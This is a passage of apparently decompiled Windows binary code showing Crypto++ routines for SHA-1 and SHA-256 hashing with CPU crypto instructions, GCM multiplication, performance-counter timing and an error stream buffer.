      __asm { sha1rnds4 xmm5, xmm0, 0 }
      _XMM2 = _mm_xor_si128(_XMM6, _XMM3);
      _XMM7 = _mm_xor_si128(_XMM7, _XMM4);
      __asm
      {
        sha1msg2 xmm2, xmm4
        sha1msg1 xmm6, xmm4
        sha1nexte xmm1, xmm2
        sha1msg2 xmm7, xmm2
      }
      _XMM0 = _XMM5;
      _XMM6 = _mm_xor_si128(_XMM6, _XMM2);
      __asm
      {
        sha1rnds4 xmm5, xmm1, 1
        sha1nexte xmm0, xmm7
        sha1msg2 xmm6, xmm7
      }
      _XMM1 = _XMM5;
      __asm
      {
        sha1rnds4 xmm5, xmm0, 1
        sha1msg1 xmm4, xmm2
        sha1nexte xmm1, xmm6
      }
      _XMM0 = _XMM5;
      _XMM3 = _mm_xor_si128(_XMM7, _XMM4);
      __asm
      {
        sha1rnds4 xmm5, xmm1, 1
        sha1msg1 xmm2, xmm7
        sha1msg2 xmm3, xmm6
      }
      _XMM1 = _XMM5;
      _XMM4 = _XMM5;
      _XMM5 = _mm_xor_si128(_XMM6, _XMM2);
      __asm
      {
        sha1msg1 xmm7, xmm6
        sha1nexte xmm0, xmm3
        sha1msg2 xmm5, xmm3
        sha1rnds4 xmm4, xmm0, 1
      }
      _XMM7 = _mm_xor_si128(_XMM7, _XMM3);
      _XMM0 = _XMM4;
      __asm
      {
        sha1msg2 xmm7, xmm5
        sha1nexte xmm1, xmm5
        sha1msg1 xmm6, xmm3
        sha1rnds4 xmm4, xmm1, 1
        sha1msg1 xmm3, xmm5
      }
      _XMM6 = _mm_xor_si128(_XMM6, _XMM5);
      __asm { sha1nexte xmm0, xmm7 }
      _XMM1 = _XMM4;
      _XMM2 = _mm_xor_si128(_XMM7, _XMM3);
      __asm
      {
        sha1msg2 xmm6, xmm7
        sha1rnds4 xmm4, xmm0, 2
        sha1msg1 xmm5, xmm7
      }
      _XMM0 = _XMM4;
      __asm { sha1msg2 xmm2, xmm6 }
      v8 += 4;
      __asm
      {
        sha1nexte xmm1, xmm6
        sha1rnds4 xmm4, xmm1, 2
      }
      v124 = _XMM4;
      _XMM1 = _XMM4;
      _XMM4 = _mm_xor_si128(_XMM6, _XMM5);
      _XMM5 = v124;
      __asm { sha1msg1 xmm7, xmm6 }
      _XMM7 = _mm_xor_si128(_XMM7, _XMM2);
      __asm
      {
        sha1nexte xmm0, xmm2
        sha1rnds4 xmm5, xmm0, 2
      }
      _XMM0 = _XMM5;
      __asm
      {
        sha1msg2 xmm4, xmm2
        sha1msg1 xmm6, xmm2
      }
      _XMM6 = _mm_xor_si128(_XMM6, _XMM4);
      __asm
      {
        sha1nexte xmm1, xmm4
        sha1rnds4 xmm5, xmm1, 2
      }
      _XMM1 = _XMM5;
      __asm
      {
        sha1msg2 xmm7, xmm4
        sha1msg2 xmm6, xmm7
        sha1nexte xmm0, xmm7
        sha1rnds4 xmm5, xmm0, 2
      }
      _XMM0 = _XMM5;
      __asm { sha1msg1 xmm2, xmm4 }
      _XMM3 = _mm_xor_si128(_XMM7, _XMM2);
      __asm
      {
        sha1nexte xmm1, xmm6
        sha1rnds4 xmm5, xmm1, 3
      }
      _XMM1 = _XMM5;
      __asm { sha1msg1 xmm4, xmm7 }
      _XMM2 = _mm_xor_si128(_XMM6, _XMM4);
      __asm
      {
        sha1msg2 xmm3, xmm6
        sha1msg1 xmm7, xmm6
      }
      _XMM7 = _mm_xor_si128(_XMM7, _XMM3);
      __asm
      {
        sha1nexte xmm0, xmm3
        sha1rnds4 xmm5, xmm0, 3
      }
      _XMM0 = _XMM5;
      __asm
      {
        sha1msg2 xmm2, xmm3
        sha1nexte xmm1, xmm2
        sha1rnds4 xmm5, xmm1, 3
      }
      _XMM1 = _XMM5;
      __asm { sha1msg1 xmm6, xmm3 }
      _XMM6 = _mm_xor_si128(_XMM6, _XMM2);
      __asm
      {
        sha1msg2 xmm7, xmm2
        sha1nexte xmm0, xmm7
        sha1rnds4 xmm5, xmm0, 3
      }
      _XMM4 = _XMM5;
      __asm
      {
        sha1nexte xmm4, [esp+40h+var_20]
        sha1msg2 xmm6, xmm7
        sha1nexte xmm1, xmm6
      }
      v7 = v125;
      __asm { sha1rnds4 xmm5, xmm1, 3 }
      _XMM5 = _mm_add_epi32(_XMM5, v127);
      --v9;
    }
    while ( v9 );
  }
  *a1 = _mm_shuffle_epi32(_XMM5, 27);
  a1[1].m128i_i32[0] = _mm_extract_epi32(_XMM4, 3);
  return result;
}
// 4BD0C0: using guessed type __int128 xmmword_4BD0C0;
// 4BD0D0: using guessed type __int128 xmmword_4BD0D0;

//----- (00467FB0) --------------------------------------------------------
__m128i *__cdecl sub_467FB0(__m128i *a1, __m128i *a2, unsigned int a3, int a4)
{
  __m128i *result; // eax
  __m128i v5; // xmm5
  __m128i v6; // xmm0
  __m128i v7; // xmm2
  __m128i v9; // xmm2
  __m128i *v10; // ecx
  unsigned int v11; // edx
  __m128i v92; // xmm1
  __m128i v93; // xmm2
  __int128 v94; // [esp+0h] [ebp-50h]
  __int128 v95; // [esp+0h] [ebp-50h]
  __int128 v96; // [esp+0h] [ebp-50h]
  __int128 v97; // [esp+0h] [ebp-50h]
  __int128 v98; // [esp+10h] [ebp-40h]
  __m128i v99; // [esp+20h] [ebp-30h]
  __m128i v100; // [esp+30h] [ebp-20h]
  __m128i v101; // [esp+40h] [ebp-10h]

  result = a1;
  if ( a4 == 1 )
    v5 = (__m128i)xmmword_4BC6C0;
  else
    v5 = (__m128i)xmmword_4BD0E0;
  v6 = _mm_shuffle_epi32(*a1, 177);
  v7 = _mm_shuffle_epi32(a1[1], 27);
  _XMM4 = _mm_alignr_epi8(v6, v7, 8);
  v9 = _mm_blend_epi16(v7, v6, 240);
  v99 = v9;
  v100 = v5;
  if ( a3 >= 0x40 )
  {
    v10 = a2 + 2;
    v11 = a3 >> 6;
    do
    {
      _XMM7 = v9;
      _XMM1 = _mm_shuffle_epi8(v10[-2], v5);
      _XMM2 = _mm_shuffle_epi8(v10[-1], v5);
      v101 = _XMM4;
      __asm
      {
        sha256rnds2 xmm7, xmm4, xmm0
        sha256rnds2 xmm4, xmm7, xmm0
        sha256rnds2 xmm7, xmm4, xmm0
        sha256rnds2 xmm4, xmm7, xmm0
      }
      _XMM3 = _mm_shuffle_epi8(*v10, v5);
      __asm
      {
        sha256msg1 xmm1, xmm2
        sha256rnds2 xmm7, xmm4, xmm0
        sha256rnds2 xmm4, xmm7, xmm0
      }
      v94 = _XMM4;
      __asm { sha256msg1 xmm2, xmm3 }
      _XMM4 = _mm_shuffle_epi8(v10[1], v5);
      __asm { sha256rnds2 xmm7, [esp+50h+var_50], xmm0 }
      _XMM5 = _mm_add_epi32(_mm_alignr_epi8(_XMM4, _XMM3, 4), _XMM1);
      _XMM1 = v94;
      __asm
      {
        sha256rnds2 xmm1, xmm7, xmm0
        sha256msg2 xmm5, xmm4
        sha256rnds2 xmm7, xmm1, xmm0
        sha256rnds2 xmm1, xmm7, xmm0
      }
      _XMM6 = _mm_add_epi32(_mm_alignr_epi8(_XMM5, _XMM4, 4), _XMM2);
      __asm
      {
        sha256msg2 xmm6, xmm5
        sha256rnds2 xmm7, xmm1, xmm0
        sha256msg1 xmm3, xmm4
        sha256rnds2 xmm1, xmm7, xmm0
      }
      _XMM2 = _mm_add_epi32(_mm_alignr_epi8(_XMM6, _XMM5, 4), _XMM3);
      __asm
      {
        sha256msg2 xmm2, xmm6
        sha256rnds2 xmm7, xmm1, xmm0
        sha256msg1 xmm4, xmm5
      }
      _XMM3 = _mm_add_epi32(_mm_alignr_epi8(_XMM2, _XMM6, 4), _XMM4);
      __asm
      {
        sha256rnds2 xmm1, xmm7, xmm0
        sha256msg2 xmm3, xmm2
      }
      _XMM4 = _XMM1;
      __asm { sha256rnds2 xmm7, xmm1, xmm0 }
      _XMM1 = _XMM7;
      __asm { sha256msg1 xmm5, xmm6 }
      _XMM7 = _mm_add_epi32(_mm_alignr_epi8(_XMM3, _XMM2, 4), _XMM5);
      __asm
      {
        sha256msg1 xmm6, xmm2
        sha256msg2 xmm7, xmm3
        sha256rnds2 xmm4, xmm1, xmm0
        sha256rnds2 xmm1, xmm4, xmm0
      }
      v98 = _XMM1;
      _XMM1 = _mm_add_epi32(_mm_alignr_epi8(_XMM7, _XMM3, 4), _XMM6);
      _XMM6 = v98;
      __asm
      {
        sha256rnds2 xmm4, xmm6, xmm0
        sha256msg2 xmm1, xmm7
      }
      v95 = _XMM4;
      __asm
      {
        sha256rnds2 xmm6, xmm4, xmm0
        sha256msg1 xmm2, xmm3
      }
      _XMM4 = _mm_add_epi32(_mm_alignr_epi8(_XMM1, _XMM7, 4), _XMM2);
      _XMM2 = v95;
      __asm
      {
        sha256rnds2 xmm2, xmm6, xmm0
        sha256msg2 xmm4, xmm1
        sha256rnds2 xmm6, xmm2, xmm0
        sha256rnds2 xmm2, xmm6, xmm0
        sha256msg1 xmm3, xmm7
      }
      _XMM5 = _mm_add_epi32(_mm_alignr_epi8(_XMM4, _XMM1, 4), _XMM3);
      __asm
      {
        sha256msg2 xmm5, xmm4
        sha256rnds2 xmm6, xmm2, xmm0
        sha256rnds2 xmm2, xmm6, xmm0
        sha256msg1 xmm7, xmm1
        sha256msg1 xmm1, xmm4
      }
      _XMM3 = _mm_add_epi32(_mm_alignr_epi8(_XMM5, _XMM4, 4), _XMM7);
      v96 = _XMM2;
      __asm
      {
        sha256msg2 xmm3, xmm5
        sha256rnds2 xmm6, xmm2, xmm0
      }
      _XMM2 = _mm_add_epi32(_mm_alignr_epi8(_XMM3, _XMM5, 4), _XMM1);
      _XMM1 = v96;
      __asm
      {
        sha256rnds2 xmm1, xmm6, xmm0
        sha256msg2 xmm2, xmm3
      }
      v97 = _XMM1;
      __asm
      {
        sha256rnds2 xmm6, xmm1, xmm0
        sha256msg1 xmm4, xmm5
      }
      _XMM1 = _mm_add_epi32(_mm_alignr_epi8(_XMM2, _XMM3, 4), _XMM4);
      _XMM4 = v97;
      __asm
      {
        sha256rnds2 xmm4, xmm6, xmm0
        sha256msg2 xmm1, xmm2
        sha256rnds2 xmm6, xmm4, xmm0
        sha256rnds2 xmm4, xmm6, xmm0
        sha256msg1 xmm5, xmm3
      }
      _XMM0 = _mm_add_epi32(_mm_alignr_epi8(_XMM1, _XMM2, 4), _XMM5);
      __asm
      {
        sha256msg2 xmm0, xmm1
        sha256rnds2 xmm6, xmm4, xmm0
      }
      v10 += 4;
      v9 = _mm_add_epi32(v99, _XMM6);
      v99 = v9;
      v5 = v100;
      __asm { sha256rnds2 xmm4, xmm6, xmm0 }
      _XMM4 = _mm_add_epi32(_XMM4, v101);
      --v11;
    }
    while ( v11 );
  }
  v92 = _mm_shuffle_epi32(v99, 177);
  v93 = _mm_shuffle_epi32(_XMM4, 27);
  *a1 = _mm_blend_epi16(v93, v92, 240);
  a1[1] = _mm_alignr_epi8(v92, v93, 8);
  return result;
}
// 4BC6C0: using guessed type __int128 xmmword_4BC6C0;
// 4BD0E0: using guessed type __int128 xmmword_4BD0E0;

//----- (00468340) --------------------------------------------------------
unsigned int __cdecl sub_468340(__m128i *a1, unsigned int a2, __m128i *a3, __m128i *a4)
{
  __m128i *v4; // eax
  __m128i v5; // xmm3
  __m128i v6; // xmm2
  unsigned int v7; // edi
  __m128i v8; // xmm1
  __m128i v9; // xmm6
  __m128i *v10; // esi
  int v12; // edx
  int v13; // ecx
  __m128i v14; // xmm7
  __m128i v15; // xmm5
  __m128i *v17; // eax
  __m128i v18; // xmm0
  __m128i *v19; // eax
  int v20; // ecx
  __m128i v21; // xmm1
  __m128i v25; // xmm3
  __m128i v30; // xmm4
  __m128i v31; // xmm0
  __m128i v37; // xmm1
  __m128i v38; // xmm3
  __m128i v44; // xmm3
  __m128i v46; // xmm1
  __m128i v50; // xmm2
  __m128i v53; // xmm1
  __m128i v54; // xmm1
  __m128i v56; // xmm0
  __m128i *v62; // [esp+Ch] [ebp-6Ch]
  __m128i v63; // [esp+18h] [ebp-60h]
  __m128i v64; // [esp+28h] [ebp-50h]
  __m128i v65; // [esp+38h] [ebp-40h]
  __m128i v66; // [esp+48h] [ebp-30h]

  v4 = a4;
  v5 = (__m128i)xmmword_4BC840;
  v6 = *a4;
  v7 = a2;
  if ( a2 >= 0x10 )
  {
    v8 = 0i64;
    v9 = a3[1];
    v10 = a3 + 1;
    _XMM4 = *a3;
    do
    {
      v65 = v8;
      v12 = v7 >> 4;
      v64 = _XMM4;
      v13 = 1;
      v63 = v9;
      if ( v7 >> 4 > 8 )
        v12 = 8;
      v14 = 0i64;
      v15 = 0i64;
      _XMM6 = _mm_xor_si128(v9, _XMM4);
      v17 = &a1[v12];
      v62 = v17;
      v18 = _mm_shuffle_epi8(v17[-1], v5);
      if ( v12 == 1 )
      {
LABEL_9:
        _XMM1 = _mm_xor_si128(_mm_shuffle_epi8(*a1, (__m128i)xmmword_4BD0C0), v6);
        _XMM3 = _XMM1;
        _XMM2 = _mm_xor_si128(_mm_shuffle_epi32(_XMM1, 78), _XMM1);
        __asm { pclmulqdq xmm3, [esp+80h+var_60], 1 }
        v44 = _mm_xor_si128(_XMM3, v65);
        __asm { pclmulqdq xmm1, xmm4, 0 }
        v46 = _mm_xor_si128(_XMM1, v14);
        __asm { pclmulqdq xmm2, xmm6, 0 }
      }
      else
      {
        v19 = (__m128i *)((char *)v17 - 24);
        while ( 1 )
        {
          v20 = v13 + 1;
          v21 = _mm_shuffle_epi8(*v19, v5);
          _XMM3 = v18;
          _XMM0 = _mm_xor_si128(v18, v21);
          __asm { pclmulqdq xmm3, xmm4, 1 }
          v25 = _mm_xor_si128(_XMM3, v14);
          _XMM7 = v63;
          _XMM4 = v21;
          __asm { pclmulqdq xmm0, xmm6, 1 }
          v15 = _mm_xor_si128(v15, _XMM0);
          v66 = v15;
          __asm { pclmulqdq xmm4, xmm7, 1 }
          v30 = _mm_xor_si128(_XMM4, v65);
          if ( v20 == v12 )
            break;
          v31 = v19[-1];
          v13 = v20 + 1;
          v19 -= 2;
          _XMM7 = v21;
          v18 = _mm_shuffle_epi8(v31, (__m128i)xmmword_4BD0C0);
          __asm { pclmulqdq xmm7, [esp+80h+var_50], 10h }
          v14 = _mm_xor_si128(_XMM7, v25);
          _XMM3 = v18;
          _XMM5 = _mm_xor_si128(v18, v21);
          __asm { pclmulqdq xmm3, [esp+80h+var_60], 10h }
          v37 = v10[2];
          v38 = _mm_xor_si128(_XMM3, v30);
          _XMM4 = v10[1];
          v10 += 2;
          v65 = v38;
          v5 = (__m128i)xmmword_4BC840;
          v64 = _XMM4;
          v63 = v37;
          __asm { pclmulqdq xmm5, xmm6, 10h }
          v15 = _mm_xor_si128(_XMM5, v66);
          _XMM6 = _mm_xor_si128(v37, _XMM4);
          if ( v13 == v12 )
            goto LABEL_9;
        }
        v56 = _mm_xor_si128(_mm_shuffle_epi8(*a1, (__m128i)xmmword_4BD0C0), v6);
        _XMM1 = v56;
        __asm { pclmulqdq xmm1, [esp+80h+var_50], 10h }
        v46 = _mm_xor_si128(_XMM1, v25);
        _XMM2 = _mm_xor_si128(_mm_shuffle_epi32(v56, 78), v56);
        _XMM3 = v56;
        __asm { pclmulqdq xmm3, xmm7, 11h }
        v44 = _mm_xor_si128(_XMM3, v30);
        __asm { pclmulqdq xmm2, xmm6, 10h }
      }
      v7 -= 16 * v12;
      v10 = a3 + 1;
      a1 = v62;
      _XMM0 = v46;
      __asm { pclmulqdq xmm0, ds:xmmword_4BD220, 10h }
      v50 = _mm_xor_si128(
              _mm_xor_si128(_mm_xor_si128(_mm_xor_si128(_mm_xor_si128(_XMM2, v15), v46), v44), _mm_slli_si128(v46, 8)),
              _XMM0);
      _XMM1 = _mm_slli_epi64(_mm_xor_si128(_mm_srli_si128(v46, 8), v50), 1u);
      __asm { pclmulqdq xmm1, ds:xmmword_4BD220, 0 }
      v53 = _mm_xor_si128(_XMM1, v44);
      v5 = (__m128i)xmmword_4BC840;
      v54 = _mm_xor_si128(v53, _mm_srli_si128(v50, 8));
      _XMM4 = *a3;
      v6 = _mm_xor_si128(_mm_srli_epi64(_mm_unpacklo_epi64(v50, v54), 0x3Fu), _mm_slli_epi64(v54, 1u));
      v8 = 0i64;
      v9 = a3[1];
    }
    while ( v7 >= 0x10 );
    v4 = a4;
  }
  *v4 = v6;
  return v7;
}
// 4BC840: using guessed type __int128 xmmword_4BC840;
// 4BD0C0: using guessed type __int128 xmmword_4BD0C0;

//----- (004685C0) --------------------------------------------------------
__m128i *__cdecl sub_4685C0(__m128i *a1)
{
  __m128i *result; // eax

  result = a1;
  *a1 = _mm_shuffle_epi8(*a1, (__m128i)xmmword_4BD0C0);
  return result;
}
// 4BD0C0: using guessed type __int128 xmmword_4BD0C0;

//----- (004685E0) --------------------------------------------------------
unsigned int __cdecl sub_4685E0(__m128i *a1, int a2, int a3)
{
  int v3; // edx
  __m128i v6; // xmm3
  unsigned int result; // eax
  int v8; // ecx
  __m128i v15; // xmm2
  __m128i v18; // xmm2
  __m128i v23; // xmm1
  __m128i v31; // xmm3
  __m128i v34; // xmm3
  __m128i v38; // xmm1
  __m128i v45; // xmm2
  __m128i v48; // xmm2
  __m128i v53; // xmm1
  __m128i v54; // xmm2

  v3 = 0;
  _XMM5 = xmmword_4BD220;
  _XMM4 = _mm_shuffle_epi8(*a1, (__m128i)xmmword_4BD0C0);
  v6 = _XMM4;
  result = a3 - 32;
  if ( a3 != 32 )
  {
    v8 = a2 + 8;
    result = ((unsigned int)(a3 - 33) >> 5) + 1;
    v3 = 32 * result;
    do
    {
      *(_QWORD *)(v8 - 8) = v6.m128i_i64[0];
      _XMM2 = v6;
      v8 += 32;
      _XMM0 = v6;
      _XMM1 = v6;
      __asm
      {
        pclmulqdq xmm1, xmm4, 0
        pclmulqdq xmm0, xmm4, 1
        pclmulqdq xmm2, xmm4, 10h
      }
      v15 = _mm_xor_si128(_mm_xor_si128(_XMM2, _XMM0), _mm_slli_si128(_XMM1, 8));
      _XMM0 = _XMM1;
      __asm { pclmulqdq xmm0, xmm5, 10h }
      v18 = _mm_xor_si128(v15, _XMM0);
      _XMM0 = v6;
      _XMM1 = _mm_slli_epi64(_mm_xor_si128(_mm_srli_si128(_XMM1, 8), v18), 1u);
      __asm
      {
        pclmulqdq xmm0, xmm4, 11h
        pclmulqdq xmm1, xmm5, 0
      }
      v23 = _mm_xor_si128(_mm_xor_si128(_XMM1, _XMM0), _mm_srli_si128(v18, 8));
      _XMM2 = _mm_xor_si128(_mm_srli_epi64(_mm_unpacklo_epi64(v18, v23), 0x3Fu), _mm_slli_epi64(v23, 1u));
      _XMM0 = _XMM2;
      _XMM1 = _XMM2;
      *(__m128i *)(v8 - 24) = _XMM2;
      *(__m128i *)(v8 - 32) = v6;
      *(_QWORD *)(v8 - 32) = _XMM2.m128i_i64[0];
      _XMM3 = _XMM2;
      __asm
      {
        pclmulqdq xmm1, xmm4, 0
        pclmulqdq xmm0, xmm4, 1
        pclmulqdq xmm3, xmm4, 10h
      }
      v31 = _mm_xor_si128(_mm_xor_si128(_XMM3, _XMM0), _mm_slli_si128(_XMM1, 8));
      _XMM0 = _XMM1;
      __asm { pclmulqdq xmm0, xmm5, 10h }
      v34 = _mm_xor_si128(v31, _XMM0);
      _XMM1 = _mm_slli_epi64(_mm_xor_si128(_mm_srli_si128(_XMM1, 8), v34), 1u);
      __asm
      {
        pclmulqdq xmm1, xmm5, 0
        pclmulqdq xmm2, xmm4, 11h
      }
      v38 = _mm_xor_si128(_mm_xor_si128(_XMM1, _XMM2), _mm_srli_si128(v34, 8));
      v6 = _mm_xor_si128(_mm_srli_epi64(_mm_unpacklo_epi64(v34, v38), 0x3Fu), _mm_slli_epi64(v38, 1u));
      --result;
    }
    while ( result );
  }
  _XMM2 = v6;
  *(_QWORD *)(v3 + a2) = v6.m128i_i64[0];
  __asm { pclmulqdq xmm2, xmm4, 10h }
  _XMM0 = v6;
  _XMM1 = v6;
  __asm
  {
    pclmulqdq xmm0, xmm4, 1
    pclmulqdq xmm1, xmm4, 0
  }
  v45 = _mm_xor_si128(_mm_xor_si128(_XMM2, _XMM0), _mm_slli_si128(_XMM1, 8));
  _XMM0 = _XMM1;
  __asm { pclmulqdq xmm0, xmm5, 10h }
  v48 = _mm_xor_si128(v45, _XMM0);
  _XMM0 = v6;
  _XMM1 = _mm_slli_epi64(_mm_xor_si128(_mm_srli_si128(_XMM1, 8), v48), 1u);
  __asm
  {
    pclmulqdq xmm0, xmm4, 11h
    pclmulqdq xmm1, xmm5, 0
  }
  v53 = _mm_xor_si128(_mm_xor_si128(_XMM1, _XMM0), _mm_srli_si128(v48, 8));
  v54 = _mm_xor_si128(_mm_srli_epi64(_mm_unpacklo_epi64(v48, v53), 0x3Fu), _mm_slli_epi64(v53, 1u));
  *(__m128i *)(v3 + a2 + 16) = v54;
  *(__m128i *)(v3 + a2 + 8) = v6;
  *(_QWORD *)(v3 + a2 + 8) = v54.m128i_i64[0];
  return result;
}
// 4BD0C0: using guessed type __int128 xmmword_4BD0C0;
// 4BD220: using guessed type __int128 xmmword_4BD220;

//----- (004687C0) --------------------------------------------------------
__m128i *__cdecl sub_4687C0(__m128i *a1, __m128i *a2, __m128i *a3)
{
  __m128i *result; // eax

  result = a3;
  *a1 = _mm_xor_si128(*a2, *a3);
  return result;
}

//----- (004687E0) --------------------------------------------------------
LARGE_INTEGER sub_4687E0()
{
  unsigned int LastError; // eax
  char *v2; // eax
  _DWORD *v3; // eax
  LARGE_INTEGER PerformanceCount; // [esp+4h] [ebp-70h] BYREF
  char v5[24]; // [esp+Ch] [ebp-68h] BYREF
  char v6[24]; // [esp+24h] [ebp-50h] BYREF
  char pExceptionObject[40]; // [esp+3Ch] [ebp-38h] BYREF
  int v8; // [esp+70h] [ebp-4h]

  PerformanceCount.QuadPart = 0i64;
  if ( !QueryPerformanceCounter(&PerformanceCount) )
  {
    LastError = GetLastError();
    v2 = (char *)sub_434410((int)v6, LastError, 0xAu);
    v8 = 0;
    v3 = (_DWORD *)sub_421FB0((int)v5, "Timer: QueryPerformanceCounter failed with error ", v2);
    LOBYTE(v8) = 1;
    sub_405180(pExceptionObject, 6, v3);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVException_CryptoPP__);
  }
  return PerformanceCount;
}
// 4687E0: using guessed type char var_50[24];
// 4687E0: using guessed type char var_68[24];

//----- (00468890) --------------------------------------------------------
__int64 sub_468890()
{
  unsigned int LastError; // eax
  char *v2; // eax
  _DWORD *v3; // eax
  LARGE_INTEGER Frequency; // [esp+4h] [ebp-70h] BYREF
  char v5[24]; // [esp+Ch] [ebp-68h] BYREF
  char v6[24]; // [esp+24h] [ebp-50h] BYREF
  char pExceptionObject[40]; // [esp+3Ch] [ebp-38h] BYREF
  int v8; // [esp+70h] [ebp-4h]

  if ( dword_4F0140 > *(_DWORD *)(*((_DWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + TlsIndex) + 4) )
  {
    _Init_thread_header(&dword_4F0140);
    if ( dword_4F0140 == -1 )
    {
      v8 = 0;
      Frequency.QuadPart = 0i64;
      if ( !QueryPerformanceFrequency(&Frequency) )
      {
        LastError = GetLastError();
        v2 = (char *)sub_434410((int)v6, LastError, 0xAu);
        LOBYTE(v8) = 1;
        v3 = (_DWORD *)sub_421FB0((int)v5, "Timer: QueryPerformanceFrequency failed with error ", v2);
        LOBYTE(v8) = 2;
        sub_405180(pExceptionObject, 6, v3);
        _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVException_CryptoPP__);
      }
      qword_4F0138 = Frequency.QuadPart;
      _Init_thread_footer(&dword_4F0140);
    }
  }
  return qword_4F0138;
}
// 46C388: using guessed type _DWORD __cdecl _Init_thread_footer(_DWORD);
// 46C3D2: using guessed type _DWORD __cdecl _Init_thread_header(_DWORD);
// 4F0138: using guessed type __int64 qword_4F0138;
// 4F0140: using guessed type int dword_4F0140;
// 4F0864: using guessed type int TlsIndex;
// 468890: using guessed type char var_50[24];
// 468890: using guessed type char var_68[24];

//----- (004689A0) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
char sub_4689A0()
{
  return 1;
}
// 468A1C: positive sp value 28 has been found

//----- (00468A20) --------------------------------------------------------
bool __cdecl sub_468A20(__int64 a1, __int64 a2)
{
  return a1 <= a2;
}

//----- (00468A40) --------------------------------------------------------
__int64 __thiscall sub_468A40(void *this)
{
  return *(_QWORD *)this;
}

//----- (00468A50) --------------------------------------------------------
_QWORD *__cdecl sub_468A50(_QWORD *a1, int a2)
{
  *a1 = 1000i64 * a2;
  return a1;
}

//----- (00468A70) --------------------------------------------------------
void __thiscall sub_468A70(void *this)
{
  void **v2; // eax
  void *v3; // esi
  _BYTE *v4; // ebx
  FILE *v5; // eax
  _DWORD *v6; // ecx
  int v7; // esi
  int v8; // edx
  _DWORD *v9; // esi
  int v10; // ecx
  void (__thiscall ***v11)(_DWORD, int); // eax

  v2 = (void **)*((_DWORD *)this + 4);
  *(_DWORD *)this = &`anonymous namespace'::DefaultErrStreamBuf::`vftable';
  v3 = *v2;
  v4 = (_BYTE *)**((_DWORD **)this + 8);
  if ( *v2 != v4 )
  {
    v5 = __acrt_iob_func(2u);
    fwrite(v3, 1u, v4 - (_BYTE *)v3, v5);
    v6 = (_DWORD *)*((_DWORD *)this + 8);
    v7 = **((_DWORD **)this + 4);
    v8 = *v6 + **((_DWORD **)this + 12);
    *v6 = v7;
    **((_DWORD **)this + 12) = v8 - v7;
    v3 = (void *)**((_DWORD **)this + 4);
  }
  j_j_j___free_base(v3);
  v9 = (_DWORD *)*((_DWORD *)this + 13);
  *(_DWORD *)this = &std::streambuf::`vftable';
  if ( v9 )
  {
    v10 = v9[1];
    if ( v10 )
    {
      v11 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v10 + 8))(v10);
      if ( v11 )
        (**v11)(v11, 1);
    }
    sub_46C87D(v9);
  }
}
// 4B8584: using guessed type void *std::streambuf::`vftable';
// 4BD2D4: using guessed type int (__stdcall *`anonymous namespace'::DefaultErrStreamBuf::`vftable')(char);

//----- (00468B00) --------------------------------------------------------
void *__thiscall sub_468B00(void *this, char a2)
{
  sub_468A70(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (00468B30) --------------------------------------------------------
int *sub_468B30()
{
  int v0; // edi
  _DWORD *v2; // esi
  int v3; // eax

  v0 = *((_DWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + TlsIndex);
  if ( dword_4F0150 > *(_DWORD *)(v0 + 4) )
  {
    _Init_thread_header(&dword_4F0150);
    if ( dword_4F0150 == -1 )
    {
      v2 = operator new(8u);
      if ( v2 )
      {
        v2[1] = std::locale::_Init(1);
        dword_4E80F4 = (int)v2;
      }
      else
      {
        dword_4E80F4 = 0;
      }
      dword_4E80CC = (int)&dword_4E80C4;
      dword_4E80D0 = (int)&dword_4E80C8;
      dword_4E80DC = (int)&dword_4E80D4;
      dword_4E80E0 = (int)&dword_4E80D8;
      dword_4E80EC = (int)&dword_4E80E4;
      dword_4E80F0 = (int)&dword_4E80E8;
      dword_4E80C8 = 0;
      dword_4E80D8 = 0;
      dword_4E80E8 = 0;
      dword_4E80C4 = 0;
      dword_4E80D4 = 0;
      dword_4E80E4 = 0;
      off_4E80C0 = (void **)&`anonymous namespace'::DefaultErrStreamBuf::`vftable';
      v3 = unknown_libname_28(64);
      *(_DWORD *)dword_4E80D0 = v3;
      *(_DWORD *)dword_4E80E0 = v3;
      *(_DWORD *)dword_4E80F0 = 64;
      atexit(sub_4B7B90);
      _Init_thread_footer(&dword_4F0150);
    }
  }
  if ( dword_4F01A8 > *(_DWORD *)(v0 + 4) )
  {
    _Init_thread_header(&dword_4F01A8);
    if ( dword_4F01A8 == -1 )
    {
      sub_41FCA0(&dword_4F0158, (int)&off_4E80C0, 0, 1);
      atexit(sub_4B7BA0);
      _Init_thread_footer(&dword_4F01A8);
    }
  }
  return &dword_4F0158;
}
// 469E4D: using guessed type struct std::locale::_Locimp *__cdecl std::locale::_Init(bool);
// 46C388: using guessed type _DWORD __cdecl _Init_thread_footer(_DWORD);
// 46C3D2: using guessed type _DWORD __cdecl _Init_thread_header(_DWORD);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 46D404: using guessed type int __cdecl unknown_libname_28(_DWORD);
// 4BD2D4: using guessed type int (__stdcall *`anonymous namespace'::DefaultErrStreamBuf::`vftable')(char);
// 4E80C0: using guessed type void **off_4E80C0;
// 4E80C4: using guessed type int dword_4E80C4;
// 4E80C8: using guessed type int dword_4E80C8;
// 4E80CC: using guessed type int dword_4E80CC;
// 4E80D0: using guessed type int dword_4E80D0;
// 4E80D4: using guessed type int dword_4E80D4;
// 4E80D8: using guessed type int dword_4E80D8;
// 4E80DC: using guessed type int dword_4E80DC;
// 4E80E0: using guessed type int dword_4E80E0;
// 4E80E4: using guessed type int dword_4E80E4;
// 4E80E8: using guessed type int dword_4E80E8;
// 4E80EC: using guessed type int dword_4E80EC;
// 4E80F0: using guessed type int dword_4E80F0;
// 4E80F4: using guessed type int dword_4E80F4;
// 4F0150: using guessed type int dword_4F0150;
// 4F0158: using guessed type int dword_4F0158;
// 4F01A8: using guessed type int dword_4F01A8;
// 4F0864: using guessed type int TlsIndex;

//----- (00468D10) --------------------------------------------------------
int __thiscall sub_468D10(_DWORD *this, int a2)
{
  int *v3; // edi
  int v4; // ecx
  int v5; // edx
  _DWORD *v6; // ecx
  _BYTE *v7; // edx
  int (__thiscall *v9)(_DWORD *); // eax

  if ( a2 == -1 || (v3 = (int *)this[12], v4 = *(_DWORD *)this[8], v5 = *v3, v4 == v4 + *v3) )
  {
